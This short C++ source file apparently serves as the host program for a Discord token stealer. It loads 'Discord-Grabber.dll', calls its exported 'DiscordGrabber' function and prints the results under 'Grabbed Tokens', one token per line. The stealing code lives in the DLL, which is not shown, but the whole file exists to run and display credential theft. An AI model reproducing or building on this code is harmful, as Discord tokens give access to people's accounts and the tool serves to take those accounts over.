#include <Windows.h>
#include <iostream>

int main()
{
	HMODULE DiscordGrabberDLL = LoadLibraryW(L"Discord-Grabber.dll");


	if (!DiscordGrabberDLL)
	{
		std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
		return 1;
	}


	auto func = (const char*(*)())GetProcAddress(DiscordGrabberDLL, "DiscordGrabber");

	if(!func)
	{
		std::cerr << "Failed to find function: " << GetLastError() << std::endl;
		return 1;
	}
	





	auto tokens = func();

	std::cout << "Grabbed Tokens: " << std::endl;

	for (size_t a = 0; tokens[a] != '\0'; a++) {
		if (tokens[a] == ':') {
			std::cout << "\n";
		}
		else {
			std::cout << tokens[a];
		}
	}

	std::cin.get();

	FreeLibrary(DiscordGrabberDLL);
	return 0;
}
